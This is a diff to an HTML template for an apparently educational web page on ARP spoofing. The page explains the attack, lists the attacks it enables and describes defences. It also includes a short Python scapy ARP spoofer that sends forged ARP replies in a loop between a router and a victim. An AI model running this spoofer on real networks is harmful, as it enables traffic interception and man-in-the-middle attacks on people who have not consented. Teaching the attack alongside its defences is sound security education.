@@ -3,28 +3,73 @@
 {% block head %} 
 {{ super() }} 
 
-
 <style>
 
 .mainH{
-  font-style: italic;
   font-weight: 700;
 }
-
 </style>
-
 
 {% endblock %}
 {% block body %}
 
-
-
 <header class="mainH">ARP Spoofer</header>
 
 <div class="scontainer">
+<section class="mainSection">
+<p>ARP spoofing is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker’s MAC address with the IP address of a legitimate computer or server on the network. Once the attacker’s MAC address is connected to an authentic IP address, the attacker will begin receiving any data that is intended for that IP address. ARP spoofing can enable malicious parties to intercept, modify or even stop data in-transit. ARP spoofing attacks can only occur on local area networks that utilize the Address Resolution Protocol.</p>
 
-    <p>Lorem ipsum, dolor sit amet consectetur adipisicing elit. Nesciunt aliquid quae fugit? Molestias eaque dolore ratione non magnam dignissimos repellendus rem, laboriosam maiores tempore, voluptate deserunt labore iusto recusandae praesentium minus sed. Velit illum id rerum, deleniti fugiat vel aspernatur expedita aliquid quaerat pariatur distinctio, quia optio? Quidem non sequi nam sapiente delectus, magni atque ratione porro explicabo? In doloremque vitae sint dolorem possimus iusto impedit eveniet natus inventore soluta reprehenderit aliquam fugiat voluptate provident neque reiciendis, quia quam commodi modi earum consequatur nemo? Reiciendis iusto consequuntur expedita, totam facilis quibusdam molestias fugiat adipisci maiores, hic fugit esse cum suscipit? Sapiente exercitationem rem fugit, numquam autem architecto, consectetur iusto officiis minima dolorem dignissimos? Perspiciatis modi, vel praesentium eius dolor totam odit nulla culpa non cupiditate iste, itaque vero. Cumque, ipsum aliquid. Facilis dolorum laboriosam, ducimus corrupti maiores officia quasi, magni, autem impedit saepe iste laudantium aliquam reprehenderit molestiae commodi facere expedita vitae ratione! Blanditiis nihil adipisci reiciendis, veniam ratione quia? Soluta harum aperiam tempore quos eaque natus laudantium consequuntur odit et labore veniam corrupti fuga repudiandae omnis ex repellat, quidem, laboriosam consectetur? Mollitia tempora nesciunt qui aliquam accusantium placeat rerum necessitatibus, doloremque voluptatem aperiam culpa autem id blanditiis tempore atque deleniti, doloribus in iusto natus cum modi! Quis ullam, nostrum voluptatum nesciunt odio dolor provident magnam ea, eaque sint repellendus quisquam deserunt at est. Eaque hic dicta id quia sed tempora quisquam quo atque at cumque ab pariatur molestias, eos veniam praesentium mollitia quidem numquam aspernatur temporibus repellat eius molestiae ad iure. Veniam totam architecto ea quia natus quas ducimus tempora. Soluta rerum aut beatae deserunt? Aut corporis commodi expedita nam dolorum? Doloribus corrupti excepturi sit non? Numquam explicabo autem veritatis in error reiciendis sapiente sequi, cumque reprehenderit perferendis ea, quos recusandae officia quas nostrum quisquam! Ipsam, odio reiciendis. Deserunt.</p>
+  <div class="cscode">
+    <p class="pcode">ARP Spoofer Class Declaration</p>
+    <pre><code class="language-py">class ArpSpoofer:
+    def get_target_mac(ip):
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        final_packet = broadcast/arp_request
+        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+        mac = answer[0][1].hwsrc
+        return mac
 
+    def spoof_arp(target_ip, spoofed_ip):
+        mac = ArpSpoofer.get_target_mac(target_ip)
+        packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
+        scapy.send(packet, verbose=False)</code></pre>
+  </div>
+
+  <div class="cscode">
+    <p class="pcode">Main Function Declaration</p>
+    <pre><code class="language-py">if __name__="__main__":
+    try:
+      while True:
+          ArpSpoofer.spoof_arp(args.a, args.v)
+          # spoof_arp("ip_of_router","ip_of_victim")
+          ArpSpoofer.spoof_arp(args.v, args.a)
+          # spoof_arp("ip_of_victim","ip_of_router")
+
+    except KeyboardInterrupt:
+        print(colored("\n[-] Stopping!!", "red"))
+        sleep(2)</code></pre>
+  </div>
+
+  <h2>ARP Spoofing Attacks</h2>
+  <p>The effects of ARP spoofing attacks can have serious implications for enterprises. In their most basic application, ARP spoofing attacks are used to steal sensitive information. Beyond this, ARP spoofing attacks are often used to facilitate other attacks such as:</p>
+
+  <ul>
+    <li>Denial-of-service attacks: DoS attacks often leverage ARP spoofing to link multiple IP addresses with a single target’s MAC address. As a result, traffic that is intended for many different IP addresses will be redirected to the target’s MAC address, overloading the target with traffic.</li>
+    <li>Session hijacking: Session hijacking attacks can use ARP spoofing to steal session IDs, granting attackers access to private systems and data.</li>
+    <li>Man-in-the-middle attacks: MITM attacks can rely on ARP spoofing to intercept and modify traffic between victims.</li>
+  </ul>
+
+  <h2>ARP Spoofing Detection, Prevention and Protection</h2>
+  <p>The following methods are recommended measures for detecting, preventing and protecting against ARP spoofing attacks:</p>
+  <ul>
+    <li>Packet filtering: Packet filters inspect packets as they are transmitted across a network. Packet filters are useful in ARP spoofing prevention because they are capable of filtering out and blocking packets with conflicting source address information (packets from outside the network that show source addresses from inside the network and vice-versa).</li>
+    <li>Avoid trust relationships: Organizations should develop protocols that rely on trust relationships as little as possible. Trust relationships rely only on IP addresses for authentication, making it significantly easier for attackers to run ARP spoofing attacks when they are in place.</li>
+    <li>Use ARP spoofing detection software: There are many programs available that help organizations detect ARP spoofing attacks. These programs work by inspecting and certifying data before it is transmitted and blocking data that appears to be spoofed.</li>
+    <li>Use cryptographic network protocols: Transport Layer Security (TLS), Secure Shell (SSH), HTTP Secure (HTTPS) and other secure communications protocols bolster ARP spoofing attack prevention by encrypting data prior to transmission and authenticating data when it is received.</li>
+  </ul>
+
+</section>    
 </div>
 
 {% endblock %}
